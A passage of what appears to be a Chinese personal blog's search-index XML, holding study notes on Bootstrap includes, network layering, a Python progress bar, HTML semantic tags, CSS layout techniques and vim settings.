class="string">&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- 可选的Bootstrap主题文件（一般不使用） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap-theme.min.css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Bootstrap教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bootstrap </tag>
            
            <tag> W3School </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2, 网络分层的真实含义</title>
      <link href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/2-%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%90%AB%E4%B9%89/"/>
      <url>/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/2-%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%90%AB%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<img src="//tva3.sinaimg.cn/large/005zbIM7gy1g0ir4gk0noj30j40jwmz6.jpg" alt="img"><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line"><span class="selector-tag">A</span><span class="selector-attr">[应用层]</span>--&gt;<span class="selector-tag">B</span><span class="selector-attr">[传输层]</span></span><br><span class="line"><span class="selector-tag">B</span>--&gt;C<span class="selector-attr">[网络层]</span></span><br><span class="line">C--&gt;D<span class="selector-attr">[链路层]</span></span><br><span class="line">D--&gt;E<span class="selector-attr">[物理层]</span></span><br></pre></td></tr></table></figure><ul><li>二层设备、三层设备，四层LB和七层LB中层？？</li><li>网络为什么要分层？  </li><li>TCP建立连接的三次握手协议？TCP在进行三次握手时，IP 层和 MAC 层都有什么操作？</li><li>协议之间的关系？<span id="more"></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 代码  进度条显示</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python-%E4%BB%A3%E7%A0%81-%E8%BF%9B%E5%BA%A6%E6%9D%A1%E6%98%BE%E7%A4%BA/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python-%E4%BB%A3%E7%A0%81-%E8%BF%9B%E5%BA%A6%E6%9D%A1%E6%98%BE%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">scale</span>=<span class="number">50</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;执行开始&#x27;</span>.center(<span class="keyword">scale</span><span class="comment">//2,&quot;-&quot;))</span></span><br><span class="line">start_time=time.perf_counter()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="keyword">scale</span>+<span class="number">1</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    a=<span class="string">&#x27;*&#x27;</span>*i</span><br><span class="line">    b=<span class="string">&#x27;.&#x27;</span>*(<span class="keyword">scale</span>-i)</span><br><span class="line">    c=(i/<span class="keyword">scale</span>)*<span class="number">100</span></span><br><span class="line">    dur=time.perf_counter()-start_time</span><br><span class="line">    #<span class="keyword">print</span>(<span class="string">&#x27;\r&#x27;</span>+str(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;\r&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&#123;:.2f&#125;s&#x27;</span>.<span class="keyword">format</span>(c,a,b,dur),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;执行结果&quot;</span>.center(<span class="keyword">scale</span><span class="comment">//2,&#x27;-&#x27;))</span></span><br></pre></td></tr></table></figure><p>计时器<span id="more"></span></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">start_time</span>=time.perf_counter()</span><br><span class="line"><span class="built_in">..</span>. <span class="built_in">..</span>.</span><br><span class="line"><span class="attribute">end_time</span>=time.perf_counter()</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&#x27;&#123;cls_name&#125; spend time:&#123;time:.5f&#125;&#x27;</span>.format(<span class="attribute">cls_name</span>=<span class="string">&quot;main_func-1&quot;</span>,time=time.perf_counter()-start_time))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1,HTML</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1-html/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1-html/</url>
      
        <content type="html"><![CDATA[<p>head 元素可以包含标题信息，元信息，样式表和脚本等。<br></br></p><h4 id="html语义化"><a href="#html语义化" class="headerlink" title="html语义化"></a>html语义化</h4><p>语义化建议：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 少使用无意义的<span class="tag">&lt;<span class="name">div</span>&gt;</span>、<span class="tag">&lt;<span class="name">span</span>&gt;</span> 标签；</span><br><span class="line">- 在 <span class="tag">&lt;<span class="name">label</span>&gt;</span> 标签中设置 for 属性和对应的 <span class="tag">&lt;<span class="name">input</span>&gt;</span> 关联起来；</span><br><span class="line">- 设置 <span class="tag">&lt;<span class="name">img</span>&gt;</span> 标签的 alt 属性，给 <span class="tag">&lt;<span class="name">a</span>&gt;</span> 标签设置 title 属性，利于 SEO；</span><br><span class="line">- 在页面的标题部分使用 <span class="tag">&lt;<span class="name">h1</span>&gt;</span>~<span class="tag">&lt;<span class="name">h6</span>&gt;</span> 标签，不需要给它们加多余的样式；</span><br><span class="line">- 与表单、有序列表、无序列表相关的标签不要单独使用。</span><br></pre></td></tr></table></figure><span id="more"></span><p>部分语义元素的用法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- <span class="tag">&lt;<span class="name">header</span>&gt;</span> 标签通常放在页面或页面某个区域的顶部，用来设置页眉；</span><br><span class="line">- <span class="tag">&lt;<span class="name">nav</span>&gt;</span> 标签可以用来定义导航链接的集合，点击链接可以跳转到其他页面；</span><br><span class="line">- <span class="tag">&lt;<span class="name">article</span>&gt;</span> 标签中的内容比较独立，可以是一篇新闻报道，一篇博客，它可以独立于页面的其他内容进行阅读；</span><br><span class="line">- <span class="tag">&lt;<span class="name">section</span>&gt;</span> 标签表示页面中的一个区域，通常对页面进行分块或对内容进行分段，<span class="tag">&lt;<span class="name">section</span>&gt;</span> 标签和 <span class="tag">&lt;<span class="name">article</span>&gt;</span> 标签可以互相嵌套；</span><br><span class="line">- <span class="tag">&lt;<span class="name">aside</span>&gt;</span> 标签用来表示除页面主要内容之外的内容，比如侧边栏；</span><br><span class="line">- <span class="tag">&lt;<span class="name">footer</span>&gt;</span> 标签位于页面或页面某个区域的底部，用来设置页脚，通常包含版权信息，联系方式等。</span><br></pre></td></tr></table></figure><h4 id="参考网址"><a href="#参考网址" class="headerlink" title="参考网址"></a>参考网址</h4><p><a href="https://www.yuque.com/fe9/basic">前端九部-入门者手册</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 基础教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2,CSS</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/2-css/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/2-css/</url>
      
        <content type="html"><![CDATA[<h4 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h4><ul><li>IE盒模型   border-box </br><br><code>width</code>和<code>height</code>是盒子最终的尺寸(添加<code>box-sizing:border-box </code>)</li><li>标准盒模型  content-box </br> <code>width</code>和<code>height</code>只是内容的尺寸(默认)<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">width</span>  <span class="attribute">height</span>  <span class="attribute">background-color</span>  <span class="attribute">border</span>  <span class="attribute">padding</span> <span class="attribute">margin</span>  (<span class="attribute">box-sizing</span>)</span><br></pre></td></tr></table></figure><h4 id="CSS布局实践"><a href="#CSS布局实践" class="headerlink" title="CSS布局实践"></a>CSS布局实践</h4><h5 id="display"><a href="#display" class="headerlink" title="display"></a>display</h5>定义了元素生成的显示框类型，常见属性值有：<code>block</code>、<code>inline</code>、<code>inline-block</code>、<code>inherit</code>、<code>none</code>、<code>flex</code>.</li><li><code>div</code>标签默认的<code>display</code>属性是<code>block</code>，通常称为<strong>块级元素</strong><ul><li>常见的块级元素<code>&lt;div&gt;</code>、<code>&lt;h1&gt;</code>~`<h6><code>、</code><p><code>、</code><ul><code>、</code>dl<code>、</code><table><code>、</code><address><code>、</code><form>`等)</li></ul></li><li><code>span</code>标签默认的<code>display</code>属性是<code>inline</code>,称为<strong>行内元素</strong><span id="more"></span><ul><li>设置宽高不会起作用( margin 和 padding 的值都只对左右起作用)</li><li>不可以包含块级元素，只能包含行内元素和文本</li><li>常见的行内元素有：<code>&lt;a&gt;</code>、<code>&lt;b&gt;</code>、<code>&lt;label&gt;</code>、<code>&lt;span&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;em&gt;</code>、<code>&lt;strong&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;input&gt;</code>等</li><li><code>&lt;img&gt;</code>标签设置宽高可以影像图片大小，这是因为 img 是<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Replaced_element">可替代元素</a>  ??</li></ul></li><li><code>inline-block</code> 即具有块级元素可以设置宽高的特性，又具有行内元素不换行的特性，但元素间会有间隙，消除看<a href="https://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/">这个</a>.</li><li><code>inherit</code>表示从父元素<strong>继承</strong><code>display</code>属性</li><li><code>none</code>表示这个元素<strong>不显示</strong>，也不占用空间位置</li><li><code>flex</code>布局(弹性布局)<ul><li>Flex布局中的元素具有可伸缩性</li><li>通过设置父元素的 display 属性为<code>display: flex | inline-flex;</code>,其子元素便有了伸缩性.</li></ul></li></ul><h5 id="position"><a href="#position" class="headerlink" title="position"></a>position</h5><p>用来定义元素的定位机制。常用的属性值有：</p><ul><li>relative：相对定位，相对于元素的正常位置进行定位；<ul><li>不添加额外属性( left , right , top , bottom 等),它表现的如同 static 一样</li><li>添加额外属性会使元素偏离正常位置，并且可能覆盖相邻元素</li></ul></li><li>absolute：绝对定位，相对于除 static定位以外的父级/祖先元素进行定位；<ul><li>如果祖先元素都没有设置定位属性，absolute 会找到最上层即浏览器窗口进行定位</li></ul></li><li>fixed：固定定位，相对于浏览器窗口进行定位，网站中的固定 header 和 footer 就是用固定定位来实现的；<ul><li>页面广告应该就是这样的吧</li></ul></li><li>static：默认值，没有定位属性，元素正常出现在文档流中；</li><li>inherit：继承父元素的 position 属性值。</li></ul><h5 id="float"><a href="#float" class="headerlink" title="float"></a>float</h5><p>float 属性定义元素在哪个方向浮动。</p><ul><li>常用属性值有<code>left</code>、<code>right</code>,即向左浮动和向右浮动。</li><li>“高度塌陷”:子元素溢出到父元素外<ul><li>不设置<code>float</code>属性，不给父元素设置宽高时， 父元素的宽高会被子元素的内容撑开(如果给父元素设置了宽高，并且宽高小于子元素时也会有 高度塌陷)</li><li>设置<code>float</code>属性时，不给父元素设置宽高，父元素不会被子元素撑开，称之为”高度塌陷”</li></ul></li></ul><img src="//tva3.sinaimg.cn/mw690/005zbIM7gy1g0fat5n6wtj30cg03b3yd.jpg" alt="img">       </br>　　　　　　　　(浮动的子元素不能撑开父元素)</br>[!清除浮动的方法](https://www.yuque.com/fe9/basic/ecdg1z)<h4 id="经典布局示例"><a href="#经典布局示例" class="headerlink" title="经典布局示例"></a>经典布局示例</h4><p>   　　大多网站会将页面分为几部分：header  (头部)、footer (尾部)<br>、nav (侧边栏) 、section (核心内容部分)</p><ul><li><p>两栏布局</p><ul><li>基础代码<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">          <span class="selector-class">.left</span>&#123;</span></span><br><span class="line"><span class="css">              <span class="attribute">width</span>:<span class="number">100px</span>;</span></span><br><span class="line"><span class="css">              <span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="css">              <span class="attribute">background-color</span>:<span class="number">#FFB5BF</span>;</span></span><br><span class="line"><span class="css">          &#125;</span></span><br><span class="line"><span class="css">          <span class="selector-class">.right</span>&#123;</span></span><br><span class="line"><span class="css">              <span class="attribute">height</span>:<span class="number">150px</span>;</span></span><br><span class="line"><span class="css">              <span class="attribute">background-color</span>: <span class="number">#94E8FF</span>;</span></span><br><span class="line"><span class="css">          &#125;</span></span><br><span class="line"><span class="css">      </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0ihf9wk41j30pq08m3ye.jpg" alt="效果图"></li><li>设置 display 为 inline-block<ul><li>container.font-size-&gt;0 消除间距</li><li>right.width-&gt; calc计算宽度</li></ul></li><li>使用float -1  <ul><li>left.float-&gt;left</li><li>right.margin-left-&gt;100px ,为左侧留空间</li><li>container.overflow-&gt;hidden</li></ul></li><li>使用浮动 -2(.right形成BFC？)<ul><li>left.float-&gt;left</li><li>right.overflow-&gt;auto  形成BFC</li><li>container.overflow-&gt;hidden</li></ul></li><li>使用absolute<ul><li>container.position-&gt;relativea</li><li>left.position-&gt;absolute</li><li>right.margin-left-&gt;100px  为左侧留空间</li></ul></li></ul></li><li><p>三栏布局</p><ul><li>圣杯布局<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">min-width</span>:<span class="number">630px</span>;  <span class="comment">/* 保证窗口缩小时仍能展示 */</span></span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.center</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">150px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#94E8FF</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>:<span class="number">#FFB5BF</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.right</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">150px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#8990D5</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span>center<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0iljrol61j30s70ci0sr.jpg" alt="效果图">###### 思想：使用浮动布局，用 padding 为左右元素留空间，灵活使用 margin 的负值和相对定位上元素移动到相应的位置。- 三栏添加左浮动- 移动 margin-left，但会覆盖 center- container 预留位置 padding-left/right- left 、right 相对移动</li><li>双飞翼布局<ul><li>多加了 div：container-center ，没有padding</li></ul></li></ul></li></ul><h5 id="Flex布局"><a href="#Flex布局" class="headerlink" title="Flex布局"></a>Flex布局</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0io7cnh3bj30ee08s3zd.jpg" alt="基本概念图">上图便是一个 Flex布局的大致架构了，图中的囊括概念有几点：- Flex 布局是一整个模块，其中父元素称为 flex container，意为容器；子元素称为 flex item，意为项目；- Flex 布局中有两条看不见的轴线：主轴（main axis）和交叉轴（cross axis）。默认的主轴是平行的，交叉轴是垂直于主轴的；- 主轴的开始位置叫 main start，结束位置叫 main end；交叉轴的开始位置叫 cross start，结束位置叫 cross end；- 子元素在主轴方向上的大小称为 main size，在交叉轴方向上的大小称为 cross size。<h5 id="容器属性-content"><a href="#容器属性-content" class="headerlink" title="容器属性 ( content )"></a>容器属性 ( content )</h5><p>定义为Flex布局的容器   display: flex | inline-flex<br>容器属性：</p><ul><li>flex-direction  方向<ul><li><strong>row</strong>   <em>(主轴，水平，起点在左侧)</em></li><li>row-reverse</li><li>column</li><li>column-reverse</li></ul></li><li>flex-wrap   换行<ul><li><strong>nowrap</strong>   <em>(不换行)</em></li><li>wrap</li><li>wrap-reverse</li></ul></li><li>flex-flow  (flex-direction 和 flex-wrap)<ul><li><strong>row no-wrap</strong></li></ul></li><li>justify-content  项目在主轴上的对齐方式<ul><li><strong>flex-start</strong></li><li>flex-end</li><li>center</li><li>space-between</li><li>space-around</li></ul></li><li>align-items    项目在交叉轴上的对齐方式<ul><li>flex-start</li><li>flex-end</li><li>center</li><li>baseline</li><li><strong>stretch</strong></li></ul></li><li>align-content  多行时垂直方向的对齐方式<ul><li>flex-start</li><li>flex-end</li><li>center</li><li>space-between</li><li>space-around</li><li>stretch</li></ul></li></ul><h5 id="项目属性-item"><a href="#项目属性-item" class="headerlink" title="项目属性( item )"></a>项目属性( item )</h5><ul><li>order <ul><li>排列顺序，defailt: 0 </li></ul></li><li>flex-grow <ul><li>存在空间剩余时，放大比例，default: 0</li><li>所有项目为1时，平分剩余空间</li></ul></li><li>flex-shrink <ul><li>空间不足时，缩小比例，set 1:等比缩小，set 0 :不缩小</li></ul></li><li>flex-basis <ul><li>default: auto</li><li>分配空间</li></ul></li><li>flex<ul><li>flex-grow、flex-shrink、flex-basis  默认值时 0  1  auto</li><li>还有两个快捷值  auto(1 1 auto )和 none （0  0  auto )</li></ul></li><li>align-self<ul><li>定义单个项目与其他项目不一样的对齐方式，可以覆盖 align-items</li><li>default : auto (继承父元素的align-items属性值，无父元素时等同 stretch)</li></ul></li></ul><h5 id="简单实例-三栏布局"><a href="#简单实例-三栏布局" class="headerlink" title="简单实例 - 三栏布局"></a>简单实例 - 三栏布局</h5><p>flex-grow: 1 　　　　ｓ  order=-1</p><p>推荐阅读：<a href="http://www.ruanyifeng.com/blog/2015/07/flex-examples.html">Flex 布局教程：实例篇</a>。</p><h5 id="Flex-浏览器兼容性问题"><a href="#Flex-浏览器兼容性问题" class="headerlink" title="Flex 浏览器兼容性问题"></a>Flex 浏览器兼容性问题</h5>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 基础教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim 配置</title>
      <link href="/categories/Linux/%E9%85%8D%E7%BD%AE/Vim%E9%85%8D%E7%BD%AE/vim-%E9%85%8D%E7%BD%AE/"/>
      <url>/categories/Linux/%E9%85%8D%E7%BD%AE/Vim%E9%85%8D%E7%BD%AE/vim-%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h5 id="配置文件内容-vimrc和-etc-vimrc"><a href="#配置文件内容-vimrc和-etc-vimrc" class="headerlink" title="配置文件内容 ~/.vimrc和/etc/vimrc"></a>配置文件内容 <code>~/.vimrc</code>和<code>/etc/vimrc</code></h5><p>&emsp;&emsp;最好再修改<code>~/.vimrc</code>文件(需先创建)</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&quot;编码  应放在首行set nocompatible之后？ /ect/vimrc</span></span><br><span class="line"><span class="keyword">set</span> encoding=utf-<span class="number">8</span></span><br><span class="line"><span class="keyword">set</span> langmenu=zh_CN.UTF-<span class="number">8</span></span><br><span class="line"><span class="keyword">language</span> message zh_CN.UTF-<span class="number">8</span></span><br><span class="line"><span class="keyword">set</span> fileencodings=ucs-bom,utf-<span class="number">8</span>,cp936,gb18030,big5,euc-jp,euc-kr,latin1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;文件内容</span></span><br><span class="line"><span class="keyword">set</span> hlsearch <span class="comment">&quot;高亮度反白</span></span><br><span class="line"><span class="keyword">set</span> backspace=<span class="number">2</span> <span class="comment">&quot;可随时用倒退键删除</span></span><br><span class="line"><span class="keyword">set</span> autoindent <span class="comment">&quot;自动缩排</span></span><br><span class="line"><span class="keyword">set</span> ruler <span class="comment">&quot;可显示最后一列的状态</span></span><br><span class="line"><span class="keyword">set</span> showmode <span class="string">&quot;左下角那一列的状态set nu &quot;</span>可以在每一列的最前面显示行号啦！</span><br><span class="line"><span class="keyword">set</span> bg=dark <span class="comment">&quot;显示不同的底色色调</span></span><br><span class="line"><span class="keyword">syntax</span> <span class="keyword">on</span> <span class="comment">&quot;进行语法检验，颜色显示。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;set by K</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">ts</span>=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span class="line"><span class="keyword">set</span> autoindent</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/foo\c -&gt; 忽略大小写    /foo\C </span></span><br><span class="line"><span class="comment">&quot;设置默认进行大小写不敏感查找 </span></span><br><span class="line"><span class="comment">&quot;如果有一个大写字母，则切换到大小写敏感查询</span></span><br><span class="line"><span class="keyword">set</span> ignorecase</span><br><span class="line"><span class="keyword">set</span> smartcase</span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="old"><a href="#old" class="headerlink" title="old"></a>old</h5><p>vim /etc/vimrc<br>设置tab为4个空格</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> <span class="attribute">ts</span>=4</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">sw</span>=4</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> <span class="attribute">ts</span>=4</span><br><span class="line"><span class="builtin-name">set</span> expandtab</span><br><span class="line"><span class="builtin-name">set</span> autoindent</span><br></pre></td></tr></table></figure><p>其他</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&quot;set by K</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">ts</span>=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span 